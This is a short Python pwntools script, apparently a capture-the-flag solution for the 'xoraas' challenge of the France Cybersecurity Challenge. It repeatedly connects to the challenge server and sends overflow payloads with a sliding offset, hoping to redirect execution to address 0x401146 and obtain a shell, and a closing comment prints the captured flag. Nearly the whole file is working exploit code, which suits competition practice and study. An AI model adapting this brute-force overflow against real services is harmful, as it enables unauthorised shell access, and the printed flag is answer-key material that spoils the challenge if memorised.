#!/usr/bin/python3
from pwn import *

i=0
while(1):
    p = remote("challenges.france-cybersecurity-challenge.fr", "2053")
    #p = process("./xoraas")
    
    # Payload generation
    print("Trying to slide address by:", i)
    payload =  i*'A' + "'p!aaaaa" + 'A'*(120-i) # first read of 128 bytes
    payload += i*'A' + "aaaaaaaa" + 'A'*(137-i) # second read of 145 bytes
    
    p.sendline(payload)
    
    # Slider iteration
    i+=1 
    if i==150:
        i=0

    try:
        # the purpose of the line below is only to trigger an exception if the local or remote program crashed
        # if it's the case (99% of cases), we'll immediately jump to the except block
        p.recv(timeout=1)

        # if we reach this point, there was no exception (1% of case)
        # it means... remote program didn't crash... so maybe we correctly executed 0x401146 and got our shell? \o/
        p.interactive()
    
    except:
        print("Bad luck :(")

# Finally the flag: FCSC{0d6c81576d1465a876422910769e79af287c9e73254112572737383039194f5d}!
